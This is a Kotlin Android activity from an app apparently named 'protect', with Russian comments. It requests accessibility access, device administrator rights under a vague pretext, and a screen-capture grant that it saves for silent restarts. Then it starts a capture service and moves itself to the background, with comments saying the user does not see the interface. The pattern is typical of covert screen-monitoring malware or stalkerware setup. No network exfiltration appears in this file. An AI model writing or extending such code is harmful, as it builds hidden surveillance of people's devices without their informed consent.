package com.sanpidor.protect

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private lateinit var startButton: Button

    companion object {
        private const val REQUEST_MEDIA_PROJECTION = 1001
        private const val REQUEST_NOTIFICATION     = 1002
        private const val REQUEST_DEVICE_ADMIN     = 1003
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText  = findViewById(R.id.status_text)
        startButton = findViewById(R.id.start_button)

        // Автостарт — сразу пытаемся запустить без лишних нажатий
        if (!ScreenCaptureService.isRunning) {
            checkPermissionsAndStart()
        }

        startButton.setOnClickListener { checkPermissionsAndStart() }
        updateStatus()
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun checkPermissionsAndStart() {
        // 1. Уведомления (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(
                    this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), REQUEST_NOTIFICATION
                )
                return
            }
        }

        // 2. Accessibility — если не включён, открываем настройки молча
        if (!isAccessibilityEnabled()) {
            statusText.text = "Шаг 1: включите службу в настройках"
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            return
        }

        // 3. Device Admin — нужен для lockNow()
        val dpm       = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComp = ComponentName(this, ProtectDeviceAdmin::class.java)
        if (!dpm.isAdminActive(adminComp)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Требуется для работы службы")
            }
            startActivityForResult(intent, REQUEST_DEVICE_ADMIN)
            return
        }

        // 4. MediaProjection — один диалог, потом данные сохраняются
        if (ScreenCaptureService.savedResultCode == 0) {
            val pm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
        } else {
            // Уже есть сохранённые данные — запускаем сразу
            launchService(ScreenCaptureService.savedResultCode, ScreenCaptureService.savedData!!)
        }
    }

    private fun launchService(resultCode: Int, data: Intent) {
        val intent = Intent(this, ScreenCaptureService::class.java).apply {
            putExtra("resultCode", resultCode)
            putExtra("data", data)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        // Сворачиваем приложение — пользователь не видит UI
        moveTaskToBack(true)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQUEST_DEVICE_ADMIN -> {
                if (resultCode == Activity.RESULT_OK) checkPermissionsAndStart()
            }
            REQUEST_MEDIA_PROJECTION -> {
                if (resultCode == Activity.RESULT_OK && data != null) {
                    launchService(resultCode, data)
                }
            }
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_NOTIFICATION) {
            checkPermissionsAndStart()
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val service = "${packageName}/${ProtectAccessibilityService::class.java.name}"
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(service)
    }

    private fun updateStatus() {
        if (ScreenCaptureService.isRunning) {
            statusText.text = "✅ Активно"
            startButton.isEnabled = false
        } else {
            statusText.text = "Запуск..."
            startButton.isEnabled = true
        }
    }
}
